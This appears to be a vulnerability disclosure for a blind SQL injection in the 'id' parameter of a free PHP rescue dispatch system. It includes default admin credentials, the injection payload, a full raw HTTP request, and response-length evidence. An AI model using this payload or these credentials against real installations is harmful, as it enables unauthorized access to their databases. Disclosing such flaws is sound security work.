# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File:  /rdms/admin/incident_reports/view_report.php?id=

Vulnerability location: /rdms/admin/incident_reports/view_report.php?id=,id

[+] Payload: /rdms/admin/incident_reports/view_report.php?id=3%27%20and%20length(database())%20=7--+ // Leak place ---> id

Current database name: rdms_db,length is 7

```sql
GET /rdms/admin/incident_reports/view_report.php?id=3%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

When length (database ()) = 6, Content-Length: 2016
![image](https://user-images.githubusercontent.com/54017627/170454143-4471b769-961f-4bb2-b66d-782545cd7d27.png)

![image](https://user-images.githubusercontent.com/54017627/170454063-b310dabd-0fb0-4e66-ac20-66f5c27894b3.png)

When length (database ()) = 7, Content-Length: 2175
![image](https://user-images.githubusercontent.com/54017627/170454117-e2ebee21-a41d-4c54-a80e-3fab6cab1a0c.png)

![image](https://user-images.githubusercontent.com/54017627/170454006-11d5ce2a-4e27-4770-9559-7b5ca66bc4d0.png)
